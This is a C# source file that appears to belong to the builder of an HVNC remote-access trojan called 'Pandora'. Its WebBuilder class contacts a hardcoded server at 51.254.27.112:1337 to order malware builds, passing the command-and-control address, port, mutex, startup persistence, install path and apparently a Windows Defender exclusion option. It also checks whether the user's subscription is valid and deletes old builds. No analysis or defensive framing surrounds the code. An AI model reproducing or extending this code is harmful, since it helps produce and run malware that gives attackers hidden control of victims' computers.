using System.IO;
using System.Net;

namespace HVNC.WebBuilder
{
	internal class WebBuilder
	{
		public static string Server = "http://51.254.27.112:1337/pandora/index.php";

		public static string Username;

		public static string DownloadURL = "http://51.254.27.112:1337/pandora/";

		public static string SendBuild(string ip, string port, string id, string mutex, string startup, string path, string folder, string filename, string wdex, string hhvnc)
		{
			try
			{
				WebRequest webRequest = WebRequest.Create(Server + "?user=" + Username + "&action=build&ip=" + ip + "&port=" + port + "&id=" + id + "&mutex=" + mutex + "&startup=" + startup + "&path=" + path + "&folder=" + folder + "&filename=" + filename + "&wdex=" + wdex + "&hhvnc=" + hhvnc);
				webRequest.Method = "GET";
				string text = new StreamReader(webRequest.GetResponse().GetResponseStream()).ReadToEnd();
				if (text.Contains("Build Completed"))
				{
					return "success";
				}
				if (text.Contains("Invalid Arguments"))
				{
					return "invalid-arguments";
				}
				if (text.Contains("missing-args"))
				{
					return "missing-args";
				}
				return text.Contains("User Not-Found OR Expired!") ? "invalid-user-or-expired" : "false";
			}
			catch (WebException)
			{
				return "error";
			}
		}

		public static string DeleteOldBuild()
		{
			try
			{
				WebRequest webRequest = WebRequest.Create(Server + "?user=" + Username + "&action=delete");
				webRequest.Method = "GET";
				return new StreamReader(webRequest.GetResponse().GetResponseStream()).ReadToEnd().Contains("deleted") ? "success" : "false";
			}
			catch (WebException)
			{
				return "error";
			}
		}

		public static string IsBuilderAlive()
		{
			try
			{
				WebRequest webRequest = WebRequest.Create(Server + "?user=" + Username + "&action=alive");
				webRequest.Method = "GET";
				return new StreamReader(webRequest.GetResponse().GetResponseStream()).ReadToEnd().Contains("alive") ? "alive" : "false";
			}
			catch (WebException)
			{
				return "error";
			}
		}
	}
}
